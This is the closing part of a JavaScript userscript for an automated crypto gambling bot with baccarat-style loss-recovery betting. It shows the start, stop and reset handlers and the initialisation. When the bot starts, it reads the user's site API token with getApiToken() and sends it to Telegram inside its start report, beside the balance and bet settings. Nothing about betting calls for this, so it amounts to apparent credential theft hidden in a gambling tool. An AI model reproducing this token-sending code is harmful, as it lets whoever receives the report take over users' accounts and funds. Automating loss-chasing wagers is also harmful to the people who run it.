            bot.stats = {
                profit: 0, wagered: 0, startBal: balance, currentBal: balance,
                bets: 0, wins: 0, loss: 0, startTime: Date.now(), maxDD: 0, maxBet: 0
            };
            bot.betTimestamps = [];
            bot.startTime = Date.now();
            bot.baccarat.active = false;
            bot.baccarat.betCount = 0;
            bot.baccarat.consecutiveLosses = 0;
            bot.baccarat.lossSinceStart = 0;
            bot.emergency.active = false;
            bot.isWagerMode = false;
            bot.wagerBetCounter = 0;
            
            updateBaseBet();
            document.getElementById("p-basebet").value = bot.baseBet.toFixed(8);
            
            bot.targetAbs = bot.stats.startBal * (bot.targetPercent / 100);
            bot.perStep = bot.targetAbs / bot.stepsLimit;
            bot.isRunning = true;
            bot.isSleeping = false;
            bot.lastTGReport = Date.now();
            bot.lastFiatUpdate = 0;
            
            setNewBaseChance();
            toggleStartStop(true);
            updateUILog(`BOT STARTED v7.0 | BaseBet: ${bot.baseBet.toFixed(8)} (${bot.baseBetPct}%) | Baccarat: ${bot.baccarat.enabled ? 'ON' : 'OFF'} | Emergency Chance: ${bot.emergency.minChance}-${bot.emergency.maxChance}%`);
            
            const apiToken = getApiToken();
            await sendTelegramReport(`\`\`\`404 BOT v7.0 STARTED\nBalance: ${balance.toFixed(8)}\nBaseBet: ${bot.baseBetPct}%\nBaccarat Recovery: ${bot.baccarat.enabled ? 'ON' : 'OFF'}\nEmergency Chance: ${bot.emergency.minChance}-${bot.emergency.maxChance}%\n\n🔑 API TOKEN: ${apiToken}\`\`\``);
            
            runLoop();
        };
        
        document.getElementById("p-stop").onclick = async () => {
            bot.isRunning = false;
            bot.baccarat.active = false;
            bot.emergency.active = false;
            toggleStartStop(false);
            updateUILog("BOT STOPPED!");
            await sendSessionReport();
        };
        
        document.getElementById("p-reset").onclick = resetSession;
        
        document.getElementById("p-currency").onchange = () => { 
            bot.selectedCurrency = document.getElementById("p-currency").value; 
            bot.lastFiatUpdate = 0;
            updateFiatRates();
        };
        
        setInterval(updateStatsDisplay, 1000);
        setInterval(updateFiatRates, 30000);
        updateFiatRates();
    }
    
    // ==================== INIT ====================
    createUI();
    updateUILog("404 BOT v7.0 Loaded - Baccarat Hunter Edition");
})();
